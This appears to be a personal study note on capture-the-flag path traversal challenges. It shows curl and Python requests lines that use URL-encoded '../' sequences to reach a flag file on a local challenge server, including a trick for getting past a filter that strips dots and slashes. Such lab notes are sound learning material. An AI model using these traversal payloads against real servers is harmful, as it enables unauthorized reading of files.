Path Traversal

###### **Path Traversal using curl**
`curl -v http://challenge.localhost/%2e%2e/%2e%2e/flag`

![[Pasted image 20241102094045.png]]
Can be written in python as:
```python
flag = requests.get("http://challenge.localhost/%2e%2e/%2e%2e/flag")
flag.text
```

Previous web server's code prevented the use of dot characters (ex. ..).
Here the web server 
This Server's source code shows it also is stripping "/", so further URL encoding is needed. 
![[server code.png]]
Sometimes, you can "fool" the filter by starting with a valid path segment that exists in the server and then doing traversal after that. With knowledge of the current directory and its contents we can manipulate the request by moving into the fortunes directory.
```
curl -v http://challenge.localhost/fortunes%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2fflag
```
- `%2e` is the URL-encoded representation of `.` (a single dot).
- `%2f` is the URL-encoded representation of `/` (a forward slash).
- When combined, `%2e%2e%2f` translates to `../`, which is the standard notation for moving up one directory in most file systems.
- In this example we move from 'challenge/files' into '/fortunes', then traversing using URL encoding to the location of the flag and running the file. 
- the flag file is ran using the command ./flag with encoding as shown in the servers HTTP request. 
![[Pasted image 20241102125054.png]]

